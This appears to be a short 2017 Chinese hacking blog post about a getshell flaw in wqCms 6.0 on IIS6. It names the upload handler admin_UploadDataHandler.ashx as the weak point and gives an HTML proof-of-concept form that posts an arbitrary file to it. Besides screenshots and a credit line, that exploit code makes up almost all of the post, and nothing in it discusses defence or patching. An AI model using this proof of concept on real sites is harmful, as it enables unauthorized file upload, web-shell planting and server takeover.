title: wqCms6.0在IIS6的Getshell
date: 2017-02-22 21:20:55
update: ""
author: me
tags:
- Hacker
categories:
- Hacker
topic: ""
cover: ""
draft: false
preview: ""
top: false
type: ""
hide: false
config: null


---


2017-02-15发布
# 一、漏洞利用点
漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点
<!--more-->
# 二、hack it
![77e968abd5e5cb3e2c4cdfbe620568fa.jpg](https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg)
![7281e4d1334393ddcc1c4926ad0065a8.jpg](https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg)
# 三、POC
```html
<html>
    <body>
        <form action="http://127.0.0.1/admin_UploadDataHandler.ashx" method="POST"enctype="multipart/form-data">
            <input  type="file" name="uploadify" />
            <input  type="text" name="saveFile" value="admin" />
            <input type="submit" name="Upload" value="Submit Query" />
        </form>
    </body>
</html>
```
转自群友论坛文章[wobushou](http://loner.fm/article.php?id=24236)
